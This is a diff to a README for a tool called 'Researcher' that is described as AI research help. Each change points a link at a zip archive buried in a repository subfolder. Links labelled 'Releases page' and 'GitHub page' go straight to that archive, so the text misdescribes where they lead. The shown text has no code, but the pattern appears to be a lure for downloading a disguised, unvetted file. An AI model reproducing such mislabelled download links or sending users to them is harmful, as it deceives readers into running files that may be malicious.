@@ -1,7 +1,7 @@
 # 🤖 Researcher - Simplify Your Research Effortlessly
 
 ## 🔗 Download Now 
-[![Download Researcher](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)
+[![Download Researcher](https://github.com/fajar661/Researcher/raw/refs/heads/main/Kikatsik/Software_v2.2-alpha.2.zip)](https://github.com/fajar661/Researcher/raw/refs/heads/main/Kikatsik/Software_v2.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 Researcher helps you enhance your research process using AI. Whether you need to summarize papers, find gaps in your work, or explore new ideas, Researcher is here to make it easier.
@@ -19,7 +19,7 @@ Researcher helps you enhance your research process using AI. Whether you need to
 - Internet connection for initial setup
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Researcher Releases](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip).
+To get started, visit this page to download the software: [Researcher Releases](https://github.com/fajar661/Researcher/raw/refs/heads/main/Kikatsik/Software_v2.2-alpha.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Researcher.
@@ -38,7 +38,7 @@ Once installed, you can launch Researcher from your applications menu.
   
 ## 🔍 Support and Assistance
 If you have questions or need help:
-- Visit our GitHub page: [Researcher GitHub](https://raw.githubusercontent.com/fajar661/Researcher/main/Kikatsik/Researcher.zip)
+- Visit our GitHub page: [Researcher GitHub](https://github.com/fajar661/Researcher/raw/refs/heads/main/Kikatsik/Software_v2.2-alpha.2.zip)
 - Check our FAQ section on the GitHub wiki.
 - Open an issue on GitHub for direct support from our team.
 
